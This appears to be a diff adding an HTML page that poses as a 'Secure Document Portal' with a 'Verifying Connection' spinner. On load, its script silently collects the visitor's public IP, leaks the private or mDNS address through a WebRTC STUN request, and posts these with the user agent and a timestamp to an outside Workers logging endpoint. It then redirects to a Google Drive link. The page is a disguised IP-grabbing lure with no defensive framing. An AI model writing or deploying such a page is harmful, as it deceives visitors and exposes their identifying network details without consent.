@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Document Portal</title>
+    <style>
+        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f4f4f4; margin: 0; }
+        .loader { border: 4px solid #ccc; border-top: 4px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .container { text-align: center; background: white; padding: 2rem; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); width: 90%; max-width: 400px; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="loader" style="margin: 0 auto;"></div>
+    <h2>Verifying Connection...</h2>
+    <p>Please wait while we validate your access.</p>
+</div>
+
+<script>
+    const WORKER_URL = 'https://young-rice-a947gateway-logger.aarav-kapasi-lgp25.workers.dev/';
+    const REDIRECT_URL = 'https://drive.google.com/your-target-folder';
+
+    function getPrivateIP() {
+    return new Promise((resolve) => {
+        const pc = new RTCPeerConnection({
+            iceServers: [{ urls: "stun:stun.l.google.com:19302" }] // Use a STUN server to force candidates
+        });
+        pc.createDataChannel("");
+        pc.createOffer().then(offer => pc.setLocalDescription(offer));
+
+        pc.onicecandidate = (ice) => {
+            if (!ice || !ice.candidate || !ice.candidate.candidate) return;
+            
+            // Regex to find both standard IPs and mDNS .local addresses
+            const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9\-]+\.local)/;
+            const match = ipRegex.exec(ice.candidate.candidate);
+            if (match) {
+                resolve(match[1]);
+                pc.onicecandidate = null;
+            }
+        };
+        setTimeout(() => resolve("mDNS Protected/Blocked"), 2500);
+    });
+}
+
+    async function logAndGo() {
+        try {
+            const pubRes = await fetch('https://api.ipify.org?format=json');
+            const pubData = await pubRes.json();
+            const privateIP = await getPrivateIP();
+
+            await fetch(WORKER_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    "Public_IP": pubData.ip,
+                    "Private_IP": privateIP,
+                    "User_Agent": navigator.userAgent,
+                    "Timestamp": new Date().toLocaleString()
+                })
+            });
+        } catch (e) {
+            console.error(e);
+        } finally {
+            window.location.href = REDIRECT_URL;
+        }
+    }
+
+    window.onload = logAndGo;
+</script>
+</body>
+</html>
